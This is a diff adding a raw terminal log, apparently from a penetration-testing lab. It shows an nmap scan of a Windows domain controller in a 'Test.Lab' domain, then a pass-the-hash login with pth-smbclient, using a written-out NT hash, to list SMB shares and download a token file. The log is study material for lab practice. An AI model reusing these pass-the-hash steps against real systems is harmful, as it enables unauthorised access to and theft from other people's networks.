@@ -1,0 +1,97 @@
+# nmap -sV -Pn -A 172.16.0.10
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-19 09:43 MSK
+Nmap scan report for 172.16.0.10
+Host is up (0.30s latency).
+Not shown: 983 filtered ports
+PORT      STATE SERVICE            VERSION
+53/tcp    open  domain             Microsoft DNS
+88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2017-07-01 05:07:02Z)
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: Test.Lab, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: TESTLAB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: Test.Lab, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=WIN-U9CSMSIDNP7.Test.Lab
+| Not valid before: 2017-06-29T06:47:11
+|_Not valid after:  2017-12-29T06:47:11
+|_ssl-date: 2017-07-01T05:08:54+00:00; -18d01h36m59s from scanner time.
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: WIN-U9CSMSIDNP7; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -18d01h36m59s, deviation: 0s, median: -18d01h36m59s
+|_nbstat: NetBIOS name: WIN-U9CSMSIDNP7, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2f:9d:23 (Oracle VirtualBox virtual NIC)
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: WIN-U9CSMSIDNP7
+|   NetBIOS computer name: WIN-U9CSMSIDNP7\x00
+|   Domain name: Test.Lab
+|   Forest name: Test.Lab
+|   FQDN: WIN-U9CSMSIDNP7.Test.Lab
+|_  System time: 2017-06-30T22:08:54-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   314.11 ms 10.255.0.1
+2   314.22 ms 172.16.0.10
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 261.27 seconds
+
+
+# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361dea164ee8fe91fe7b117fbc9ca5e 
+WARNING: The "syslog" option is deprecated
+Domain=[TESTLAB] OS=[] Server=[]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	files           Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Connection to 172.16.0.10 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+NetBIOS over TCP disabled -- no workgroup available
+
+# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 \\\\172.16.0.10\\files 6361dea164ee8fe91fe7b117fbc9ca5e 
+WARNING: The "syslog" option is deprecated
+Domain=[TESTLAB] OS=[] Server=[]
+smb: \> ls
+  .                                   D        0  Fri Jun 30 23:40:00 2017
+  ..                                  D        0  Fri Jun 30 23:40:00 2017
+  network_test.txt                    A      103  Fri Jun 30 23:43:19 2017
+  token.txt                           A       14  Sat Jul  1 04:14:55 2017
+
+		10395647 blocks of size 4096. 7254452 blocks available
+smb: \> get network_test.txt
+getting file \network_test.txt of size 103 as network_test.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+smb: \> get token.txt
+getting file \token.txt of size 14 as token.txt (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec)
+
+
